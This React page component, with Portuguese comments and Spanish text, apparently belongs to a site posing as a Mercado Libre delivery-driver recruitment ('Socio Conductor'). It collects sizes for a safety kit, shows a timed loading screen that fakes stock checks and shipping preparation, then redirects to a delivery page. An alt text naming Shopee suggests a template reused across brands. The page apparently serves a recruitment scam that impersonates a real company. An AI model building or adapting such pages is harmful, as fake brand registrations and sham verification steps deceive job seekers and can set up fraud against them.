import React, { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { z } from 'zod';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';

import Header from '@/components/Header';
import Footer from '@/components/Footer';
import Breadcrumb from '@/components/Breadcrumb';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';
import { Checkbox } from '@/components/ui/checkbox';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { useToast } from '@/hooks/use-toast';
import { LoadingModal } from '@/components/LoadingModal';
import { useScrollTop } from '@/hooks/use-scroll-top';

import kitEpiImage from '../assets/kit-epi-new.webp';

import KIT_EPI from "@assets/KIT EPI.webp";

const finalizacaoSchema = z.object({
  tamanhoColete: z.enum(['P', 'M', 'G', 'GG']),
  tamanhoLuva: z.enum(['P', 'M', 'G', 'GG']),
  numeroCalcado: z.string().min(2, "Número de calzado inválido"),
  termoUso: z.boolean().refine(val => val === true, "Debes aceptar los términos de uso"),
});

type FinalizacaoFormValues = z.infer<typeof finalizacaoSchema>;

const Finalizacao: React.FC = () => {
  // Aplica o scroll para o topo quando o componente é montado
  useScrollTop();
  
  const [, navigate] = useLocation();
  const { toast } = useToast();
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showLoadingModal, setShowLoadingModal] = useState(false);
  const [formSubmitted, setFormSubmitted] = useState(false);
  const [selectedShoeSize, setSelectedShoeSize] = useState<string>("40");

  const { register, handleSubmit, formState: { errors }, setValue, watch } = useForm<FinalizacaoFormValues>({
    resolver: zodResolver(finalizacaoSchema),
    defaultValues: {
      tamanhoColete: 'M',
      tamanhoLuva: 'M',
      numeroCalcado: '40',
      termoUso: false,
    }
  });
  
  // Função para alternar o estado do checkbox dos termos de uso
  const handleTermsToggle = () => {
    // Obter o valor atual e alterniar para o oposto
    const currentValue = watch('termoUso');
    setValue('termoUso', !currentValue, { shouldValidate: true });
  };

  // Função para selecionar o tamanho do calçado
  const handleShoeSize = (size: string) => {
    setSelectedShoeSize(size);
    setValue('numeroCalcado', size, { shouldValidate: true });
  };
  
  const handleFormSubmit = (data: FinalizacaoFormValues) => {
    setIsSubmitting(true);
    
    try {
      // Atualizando o tamanho do calçado a partir do estado
      const updatedData = {
        ...data,
        numeroCalcado: selectedShoeSize
      };
      
      // Salvando dados no localStorage
      localStorage.setItem('epi_data', JSON.stringify(updatedData));
      
      // Iniciar processo de carregamento
      setShowLoadingModal(true);
    } catch (error) {
      toast({
        title: "Error al guardar datos",
        description: "Ocurrió un error al procesar tu información. Inténtalo de nuevo.",
        variant: "destructive",
      });
      setIsSubmitting(false);
    }
  };

  const handleLoadingComplete = () => {
    setShowLoadingModal(false);
    // Redirecionar para a página de entrega em vez de mostrar a tela de finalização
    navigate('/entrega');
  };

  const handleFinalizar = () => {
    navigate('/');
    toast({
      title: "¡Registro finalizado!",
      description: "¡Felicitaciones! Tu registro se completó exitosamente. Pronto nos pondremos en contacto contigo.",
    });
  };

  return (
    <div className="bg-white min-h-screen flex flex-col">
      <Header />
      <div className="w-full bg-[#3483FA] py-1 px-6 flex items-center relative overflow-hidden">
        {/* Meia-lua no canto direito */}
        <div className="absolute right-0 top-0 bottom-0 w-32 h-full rounded-l-full bg-[#2968C8]"></div>
        
        <div className="flex items-center relative z-10">
          <div className="text-white mr-3">
            <i className="fas fa-chevron-right text-3xl font-black" style={{color: 'white'}}></i>
          </div>
          <div className="leading-none">
            <h1 className="text-base font-bold text-white mb-0">Socio Conductor</h1>
            <p className="text-white text-sm mt-0" style={{transform: 'translateY(-2px)'}}>Mercado Livre</p>
          </div>
        </div>
      </div>
      <div className="flex-grow container mx-auto px-2 py-8 w-full">
        <div className="w-full mx-auto p-6 mb-8">
          {!formSubmitted ? (
            <>
              <h1 className="text-3xl font-bold text-center mb-8 text-gray-800">Kit de Seguridad</h1>
              
              <div className="mb-8">
                <Card className="overflow-hidden">
                  <div className="bg-[#F0F7FF] p-4 border-b border-[#3483FA20]">
                    <h3 className="font-semibold text-[#3483FA]">Equipo de Protección Personal (EPP)</h3>
                  </div>
                  <div className="p-6">
                    <div className="flex flex-col md:flex-row gap-6 items-center">
                      <div className="w-full md:w-2/5">
                        <img 
                          src={KIT_EPI} 
                          alt="Kit EPI Shopee" 
                          className="w-full rounded-lg"
                        />
                      </div>
                      <div className="w-full md:w-3/5">
                        <h4 className="text-lg font-medium mb-3">Kit Completo de Seguridad</h4>
                        <p className="text-gray-600 mb-4">
                          Para garantizar tu seguridad durante las entregas, Mercado Libre exige que todos los repartidores 
                          utilicen equipos de protección individual. El kit incluye:
                        </p>
                        <ul className="list-disc pl-5 mb-4 space-y-1 text-gray-700">
                          <li>2 Chalecos reflectivos con identificación Mercado Libre (azul y amarillo)</li>
                          <li>Par de guantes de protección</li>
                          <li>Botas de seguridad antideslizantes</li>
                        </ul>
                        <div className="bg-yellow-50 p-3 rounded-md border border-yellow-200">
                          <p className="text-sm text-yellow-800">
                            <strong>Importante:</strong> El uso del kit completo es obligatorio durante todas 
                            las entregas. El no uso puede resultar en suspensión temporal.
                          </p>
                        </div>
                      </div>
                    </div>
                  </div>
                </Card>
              </div>
              
              <form onSubmit={handleSubmit(handleFormSubmit)} className="space-y-6">
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                  <div>
                    <label htmlFor="tamanhoColete" className="block text-base font-medium text-gray-800 mb-2">
                      Talla del Chaleco
                    </label>
                    <Select
                      onValueChange={(value) => setValue('tamanhoColete', value as any)}
                      defaultValue={watch('tamanhoColete')}
                    >
                      <SelectTrigger className="w-full">
                        <SelectValue placeholder="Selecciona la talla" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="P">P</SelectItem>
                        <SelectItem value="M">M</SelectItem>
                        <SelectItem value="G">G</SelectItem>
                        <SelectItem value="GG">GG</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                  
                  <div>
                    <label htmlFor="tamanhoLuva" className="block text-base font-medium text-gray-800 mb-2">
                      Talla de los Guantes
                    </label>
                    <Select
                      onValueChange={(value) => setValue('tamanhoLuva', value as any)}
                      defaultValue={watch('tamanhoLuva')}
                    >
                      <SelectTrigger className="w-full">
                        <SelectValue placeholder="Selecciona la talla" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="P">P</SelectItem>
                        <SelectItem value="M">M</SelectItem>
                        <SelectItem value="G">G</SelectItem>
                        <SelectItem value="GG">GG</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                  
                  <div>
                    <label htmlFor="numeroCalcado" className="block text-base font-medium text-gray-800 mb-2">
                      Número del Calzado
                    </label>
                    <div className="grid grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-2">
                      {Array.from({ length: 11 }, (_, i) => (i + 35).toString()).map((size) => (
                        <Button
                          key={size}
                          type="button"
                          variant="outline"
                          onClick={() => handleShoeSize(size)}
                          className={`py-2 px-4 ${
                            selectedShoeSize === size 
                              ? 'bg-[#3483FA] text-white border-[#3483FA] hover:bg-[#2968D7]' 
                              : 'border-gray-300 hover:border-[#3483FA] hover:text-[#3483FA]'
                          }`}
                        >
                          {size}
                        </Button>
                      ))}
                    </div>
                    <input 
                      type="hidden" 
                      {...register('numeroCalcado')} 
                      value={selectedShoeSize} 
                    />
                    {errors.numeroCalcado && (
                      <p className="mt-1 text-sm text-red-600">{errors.numeroCalcado.message}</p>
                    )}
                  </div>
                </div>
                
                <div className="flex items-start space-x-2 my-6">
                  <Checkbox
                    id="termoUso" 
                    {...register('termoUso')}
                    className={errors.termoUso ? 'border-red-500' : 'border-[#3483FA] data-[state=checked]:bg-[#3483FA] data-[state=checked]:text-white'}
                    onCheckedChange={() => handleTermsToggle()}
                  />
                  <div className="grid gap-1.5 leading-none" onClick={() => handleTermsToggle()}>
                    <label
                      htmlFor="termoUso"
                      className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70 cursor-pointer"
                    >
                      Acepto los términos de uso y política de seguridad de Mercado Libre
                    </label>
                    <p className="text-sm text-gray-500">
                      Declaro que usaré los equipos de protección durante todas las entregas.
                    </p>
                    {errors.termoUso && (
                      <p className="text-sm text-red-600">{errors.termoUso.message}</p>
                    )}
                  </div>
                </div>
                
                <Button
                  type="submit"
                  className="w-full bg-[#3483FA] hover:bg-[#2968D7] text-white font-medium py-6 text-base rounded-[3px]"
                  disabled={isSubmitting}
                  style={{ height: '50px' }}
                >
                  {isSubmitting ? 'Procesando...' : 'Solicitar Kit y Finalizar'}
                </Button>
              </form>
            </>
          ) : (
            <div className="max-w-2xl mx-auto text-center">
              <div className="text-[#3483FA] mb-6">
                <svg xmlns="http://www.w3.org/2000/svg" width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="mx-auto">
                  <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
                  <polyline points="22 4 12 14.01 9 11.01"></polyline>
                </svg>
              </div>
              
              <h1 className="text-3xl font-bold mb-6 text-gray-800">¡Registro Completado!</h1>
              
              <p className="text-lg text-gray-600 mb-8">
                ¡Felicitaciones! Tu registro como Socio Conductor de Mercado Libre se completó exitosamente.
                Tu kit EPI será enviado a la dirección registrada en hasta 5 días hábiles.
              </p>
              
              <div className="bg-[#F0F7FF] p-4 rounded-lg border border-[#3483FA20] mb-8">
                <h3 className="font-semibold text-[#3483FA] mb-2">Próximos Pasos:</h3>
                <ol className="list-decimal pl-6 text-left text-gray-700 space-y-2">
                  <li>Recibirás un email de confirmación en hasta 24 horas.</li>
                  <li>El kit EPI será enviado en hasta 5 días hábiles.</li>
                  <li>Después de recibir el kit, ya podrás empezar a recibir entregas.</li>
                  <li>Descarga de la aplicación de entregas de Mercado Libre (enviada por email).</li>
                </ol>
              </div>
              
              <Button
                onClick={handleFinalizar}
                className="bg-[#3483FA] hover:bg-[#2968D7] text-white font-medium py-6 text-base rounded-[3px] min-w-[200px]"
                style={{ height: '50px' }}
              >
                Volver al Inicio
              </Button>
            </div>
          )}
        </div>
      </div>
      <Footer />
      <LoadingModal
        isOpen={showLoadingModal}
        onComplete={handleLoadingComplete}
        title="Finalizando Registro"
        loadingSteps={[
          "Registrando tallas del kit EPI",
          "Verificando disponibilidad en stock",
          "Preparando envío del material",
          "Finalizando registro de conductor"
        ]}
        completionMessage="¡Registro finalizado exitosamente!"
        loadingTime={12000}
      />
    </div>
  );
};

export default Finalizacao;